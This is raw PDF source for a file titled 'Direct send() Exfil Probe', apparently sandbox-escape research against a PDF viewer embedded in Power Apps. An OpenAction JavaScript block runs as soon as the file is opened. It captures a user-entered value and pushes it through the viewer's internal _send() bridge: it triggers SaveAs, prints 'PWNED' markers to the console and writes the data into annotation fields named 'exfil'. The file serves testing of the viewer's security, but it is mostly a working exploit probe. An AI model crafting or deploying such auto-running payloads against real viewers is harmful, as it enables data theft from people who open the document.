%PDF-1.7
% Direct send() Exfil Probe - March 2026
1 0 obj
<< /Type /Catalog
   /Pages 2 0 R
   /OpenAction 3 0 R
>>
endobj

2 0 obj
<< /Type /Pages
   /Kids [4 0 R]
   /Count 1
>>
endobj

3 0 obj
<< /Type /Action
   /S /JavaScript
   /JS (
      try {
        var results = [];

        // Capture test data first
        var captured = app.response("Enter test value:", "Power Apps");
        results.push("captured: [" + captured + "]");

        if (captured !== null) {

          // The _send() function in the sandbox calls:
          // externals["send"](data) -> window.dispatchEvent(CustomEvent("updatefromsandbox"))
          // The updateFromSandbox handler in viewer.js reads:
          // { id, siblings, command, value }
          // If id is present it routes to annotationStorage.setValue(id, detail)
          // If no id it handles commands: clear/error/layout/page-num/print/zoom/SaveAs etc.

          // === TEST 1: Command without ID - trigger viewer commands ===
          results.push("=== COMMANDS ===");

          // Try SaveAs command - triggers download
          try {
            this._send({ command: "SaveAs" });
            results.push("SaveAs: sent");
          } catch(e) { results.push("SaveAs: " + e); }

          // Try println - outputs to console (visible in devtools)
          try {
            this._send({ command: "println", value: "PWNED:" + captured });
            results.push("println: sent");
          } catch(e) { results.push("println: " + e); }

          // Try zoom command
          try {
            this._send({ command: "zoom", value: 2 });
            results.push("zoom: sent");
          } catch(e) { results.push("zoom: " + e); }

          // === TEST 2: With ID - routes to annotationStorage ===
          results.push("=== ANNOTATION STORAGE ===");

          // annotationStorage.setValue(id, detail) - sets PDF form field values
          // If PowerApps reads annotationStorage, this is our bridge
          try {
            this._send({ id: "captured_data", value: captured });
            results.push("annotationStorage id: sent");
          } catch(e) { results.push("annotationStorage: " + e); }

          // Try with siblings
          try {
            this._send({ id: "exfil", siblings: ["exfil2"], value: captured });
            results.push("with siblings: sent");
          } catch(e) { results.push("siblings: " + e); }

          // === TEST 3: Try doc._send directly ===
          results.push("=== DOC SEND ===");
          try {
            doc._send({ command: "println", value: "doc._send:" + captured });
            results.push("doc._send: ok");
          } catch(e) { results.push("doc._send: " + e); }

          // === TEST 4: console.println ===
          results.push("=== CONSOLE ===");
          try {
            console.println("PWNED_CONSOLE: " + captured);
            results.push("console.println: sent");
          } catch(e) { results.push("console.println: " + e); }

        }

        app.alert(results.join("\\n"));

      } catch(e) {
        app.alert("OUTER ERROR: " + e);
      }
   )
>>
endobj

4 0 obj
<< /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 400 300]
   /Contents 5 0 R
>>
endobj

5 0 obj
<< /Length 90 >>
stream
BT /F1 14 Tf 50 250 Td (Direct Send Probe) Tj ET
BT /F1 12 Tf 50 220 Td (Watch devtools console) Tj ET
endstream
endobj

xref
0 6
0000000000 65535 f 
0000000015 00000 n 
0000000075 00000 n 
0000000135 00000 n 
0000002400 00000 n 
0000002560 00000 n 

trailer
<< /Size 6 /Root 1 0 R >>
startxref
2650
%%EOF